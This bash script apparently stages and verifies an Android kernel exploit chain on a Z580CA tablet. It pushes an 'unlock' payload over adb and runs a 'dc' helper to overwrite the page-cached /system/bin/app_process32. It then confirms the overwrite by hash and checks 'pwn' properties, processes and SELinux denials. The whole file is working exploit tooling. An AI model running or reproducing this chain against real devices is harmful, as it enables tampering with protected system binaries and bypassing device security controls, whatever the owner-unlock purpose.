#!/bin/bash
# Update the cached unlock payload in an already staged Z580CA chain.
# usage: scripts/update-cached-payload.sh [payload-file] [wait_seconds]
set -euo pipefail
SERIAL=${SERIAL:?Set SERIAL to the target adb serial}
BRIDGE=${BRIDGE:?Set BRIDGE to your SSH USB host (user@host)}
SCRIPT_DIR=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
source "$SCRIPT_DIR/lib/adb-host.sh"
adb_host_validate
P=${1:-$SCRIPT_DIR/../unlock/bin/set-unlock-flag-x86}
W=${2:-14}

[ -f "$P" ] || { echo "ERR: payload not found: $P"; exit 1; }
[[ "$W" =~ ^[0-9]+([.][0-9]+)?$ ]] || { echo 'invalid wait_seconds' >&2; exit 2; }
sz=$(stat -c %s -- "$P")
[ "$sz" -gt 0 ] || { echo 'payload must not be empty' >&2; exit 1; }
sha_local=$(sha256sum -- "$P" | cut -d' ' -f1)
case "$P" in /*) pf="$P";; *) pf="$PWD/$P";; esac
cache_prefix=$(mktemp)
trap 'rm -f -- "$cache_prefix"' EXIT

echo "== stage payload on the USB host =="
scp -q -- "$pf" "$BRIDGE:/tmp/others/payload32" || exit 2

echo "== adb push + dc into page cache =="
adb_host push /tmp/others/payload32 /data/local/tmp/p32
adb_host shell 'chmod 644 /data/local/tmp/p32'
echo "dc says:"
adb_host shell '/data/local/tmp/dc /system/bin/app_process32 /data/local/tmp/p32' 2>&1 | tail -1

echo "== cached head sha (want $sha_local over $sz B) =="
adb_host exec-out "dd if=/system/bin/app_process32 bs=1 count=$sz 2>/dev/null" > "$cache_prefix"
cached_size=$(stat -c %s -- "$cache_prefix")
sha_cached=$(sha256sum -- "$cache_prefix" | cut -d' ' -f1)
printf '%s  -\n' "$sha_cached"
if [ "$cached_size" != "$sz" ] || [ "$sha_cached" != "$sha_local" ]; then
  echo "cache verification failed: expected $sz bytes and the supplied payload digest; received $cached_size bytes" >&2
  exit 1
fi

echo "== wait ${W}s (cycle re-execs within ~5s) =="
sleep "$W"

echo "== getprop sys.pwn.* =="
adb_host_optional 'getprop | grep pwn'

echo "== ps (cycle + dumpstate straggler) =="
adb_host_optional 'ps | grep -E "app_process|dumpstate"'

echo "== parent comm stamp =="
adb_host_optional 'P=$(ps | grep /system/bin/app_process | grep -v do_exit | tr -s " " | cut -d" " -f2); echo pid=$P; [ -n "$P" ] && cat /proc/$P/comm'

echo "== .pwnstop present? =="
adb_host_optional 'ls /data/dalvik-cache/x86/.pwnstop' 2>&1

echo "== recent avc =="
adb_host_optional 'dmesg | grep avc: | tail -12'
